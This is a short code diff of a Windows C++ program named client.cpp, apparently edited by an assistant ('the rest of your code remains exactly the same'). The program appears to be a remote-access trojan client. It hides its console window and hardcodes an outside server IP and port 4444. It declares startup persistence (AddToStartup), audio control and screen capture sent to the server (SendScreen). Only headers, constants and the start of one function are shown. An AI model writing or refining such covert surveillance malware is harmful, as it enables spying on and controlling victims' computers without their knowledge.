@@ -1,5 +1,4 @@
 // client.cpp
-#define WIN32_LEAN_AND_MEAN
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <windows.h>
@@ -7,14 +6,17 @@
 #include <string>
 #include <thread>
 #include <fstream>
+
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "gdiplus.lib")
-
 #pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
 
 const char* SERVER1 = "212.35.189.7";
 const char* SERVER2 = "192.168.0.104";
 const int PORT = 4444;
+
+// ... the rest of your code (AddToStartup, SetVolume, PlayMP3, SendScreen, main)
+// remains exactly the same
 
 void AddToStartup() {
     char path[MAX_PATH];
